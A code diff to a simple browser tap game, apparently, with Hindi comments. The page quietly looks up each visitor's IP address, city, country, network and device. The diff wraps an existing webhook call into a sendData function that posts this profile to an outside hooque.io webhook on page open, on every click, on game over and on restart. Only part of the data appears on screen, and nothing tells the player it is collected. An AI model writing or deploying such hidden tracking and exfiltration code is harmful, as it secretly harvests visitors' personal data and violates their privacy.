@@ -63,6 +63,7 @@ button{
 <script>
 
 let player = document.getElementById("player");
+let userData = {};
 
 // 🌐 IP + Location fetch
 fetch('https://ipapi.co/json/')
@@ -71,46 +72,55 @@ fetch('https://ipapi.co/json/')
 
   let device = navigator.userAgent;
 
-  // screen पर दिखाओ
+  userData = {
+    ip: data.ip,
+    city: data.city,
+    country: data.country_name,
+    network: data.org,
+    device: device,
+    time: new Date()
+  };
+
   document.getElementById("info").innerHTML = `
     <p>IP: ${data.ip}</p>
     <p>City: ${data.city}</p>
     <p>Country: ${data.country_name}</p>
-    <p>Network: ${data.org}</p>
-    <p>Device: ${device}</p>
   `;
 
-  // 📡 webhook send
-  fetch('https://app.hooque.io/hooks/019d1ccc-a9be-7433-9eed-1d2f97510004', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      ip: data.ip,
-      city: data.city,
-      country: data.country_name,
-      network: data.org,
-      device: device,
-      time: new Date()
-    })
-  });
+  sendData("page_open");
 
 });
 
-// 🎮 tap se move
+// 📡 function to send data
+function sendData(type){
+  fetch('https://app.hooque.io/hooks/019d1ccc-a9be-7433-9eed-1d2f97510004', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      ...userData,
+      action: type,
+      time: new Date()
+    })
+  });
+}
+
+// 🎮 click event
 document.addEventListener("click", ()=>{
  let x = Math.random() * (window.innerWidth - 50);
  player.style.left = x + "px";
+
+ sendData("click");
 });
 
 // ⏱️ 5 sec बाद game over
 setTimeout(()=>{
  document.getElementById("gameover").style.display="flex";
+ sendData("game_over");
 },5000);
 
 // 🔁 restart
 function restartGame(){
+ sendData("restart");
  location.reload();
 }
 
